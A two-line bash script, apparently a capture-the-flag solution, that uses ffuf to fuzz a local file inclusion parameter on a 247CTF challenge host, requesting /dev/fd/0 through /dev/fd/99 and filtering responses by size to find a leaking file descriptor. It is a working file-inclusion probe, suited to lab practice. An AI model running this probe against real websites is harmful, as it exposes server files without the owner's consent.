#!/usr/bin/env bash
seq 0 99 | ffuf -u 'https://8e3a1cdf1e0a1fac.247ctf.com/?include=/dev/fd/FUZZ' -w - -fs 1974
